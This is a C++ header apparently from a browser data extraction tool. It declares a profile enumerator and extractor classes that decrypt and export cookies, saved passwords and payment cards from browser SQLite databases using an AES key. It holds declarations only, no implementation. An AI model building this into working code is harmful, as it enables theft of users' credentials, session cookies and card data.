// DataExtraction.h - Database extraction and profile enumeration
#ifndef DATA_EXTRACTION_H
#define DATA_EXTRACTION_H

#include <Windows.h>
#include <vector>
#include <string>
#include <filesystem>
#include <memory>
#include <unordered_map>
#include "winsqlite3.h"

namespace fs = std::filesystem;

namespace SecurityComponents
{
    class PipeLogger;

    // Data extraction configuration and operations
    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        typedef std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>(*PreQuerySetupFunc)(sqlite3*);
        typedef std::optional<std::string>(*JsonFormatterFunc)(sqlite3_stmt*, const std::vector<uint8_t>&, void*);
        
        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            PreQuerySetupFunc preQuerySetup;
            JsonFormatterFunc jsonFormatter;
        };

        // Pre-query setup function for payment cards
        std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> SetupPaymentCards(sqlite3* db);

        // JSON formatters for different data types
        std::optional<std::string> FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);
        std::optional<std::string> FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);
        std::optional<std::string> FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);

        // Returns all extraction configurations
        const std::vector<ExtractionConfig>& GetExtractionConfigs();
    }

    // Discovers all available browser profiles
    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(const fs::path& userDataRoot, PipeLogger& logger);
        
        // Returns paths to all valid profile directories
        std::vector<fs::path> FindProfiles();

    private:
        fs::path m_userDataRoot;
        PipeLogger& m_logger;
    };

    // Extracts data from a specific database within a profile
    class DataExtractor
    {
    public:
        DataExtractor(const fs::path& profilePath, const Data::ExtractionConfig& config,
                      const std::vector<uint8_t>& aesKey, PipeLogger& logger,
                      const fs::path& baseOutputPath, const std::string& browserName);

        // Performs extraction for configured data type
        void Extract();

    private:
        fs::path m_profilePath;
        const Data::ExtractionConfig& m_config;
        const std::vector<uint8_t>& m_aesKey;
        PipeLogger& m_logger;
        fs::path m_baseOutputPath;
        std::string m_browserName;
    };
}

#endif // DATA_EXTRACTION_H